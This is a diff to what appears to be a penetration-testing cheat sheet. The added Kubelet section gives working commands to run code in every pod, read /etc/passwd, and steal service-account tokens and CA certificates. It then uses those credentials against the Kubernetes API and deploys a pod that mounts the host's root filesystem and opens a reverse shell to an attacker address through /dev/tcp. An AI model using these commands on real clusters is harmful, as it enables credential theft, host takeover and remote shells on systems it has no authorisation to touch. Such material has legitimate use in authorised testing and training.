@@ -697,13 +697,53 @@ rlogin -l $USERNAME $TARGET
 rsh -l $USERNAME $TARGET cat /etc/passwd
 
 [*] (10249-10250) Kubelet
++---------- View Pods ----------+
 kubeletctl -s $TARGET pods
+
++---------- Execute Commands ----------+
 kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
 kubeletctl -s $TARGET run "cat /etc/passwd" -p $pod -n $namespace -c $container
+
++---------- Get Token and CA.crt ----------+
 pod=nginx; namespace=default; container=nginx
 kubeletctl -s $TARGET run "ls -la /run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
 kubeletctl -s $TARGET run "ls -la /var/run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
 kubeletctl -s $TARGET run "ls -la /secrets/kubernetes.io/serviceaccout" -p $pod -n $namespace -c $container
+kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/ca.crt" -p $pod -n $namespace -c $container | tee ca.crt; chmod 600 ca.crt
+kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/token" -p $pod -n $namespace -c $container | tee token; chmod 600 token
+
++---------- Authenticating to Kubernetes API ----------+
+kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
+
++---------- Kubernetes Privileges ----------+
+kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) auth can-i --list
+
++---------- Kubernetes Pod Details ----------+
+kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml
+kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml | grep -E 'namespace:|image:'
+
++---------- Kubernetes Create Custom YAML ----------+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: my-pod
+  namespace: $namespace
+spec:
+  containers:
+  - name: my-pod
+    image: nginx:1.14.2
+    command: ["sh"]
+    args: ["-c", "sh -i >& /dev/tcp/$MYIP/5555 0>&1"]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+
 
 [*] (1433) MSSQL
 +---------- Spray Service ----------+
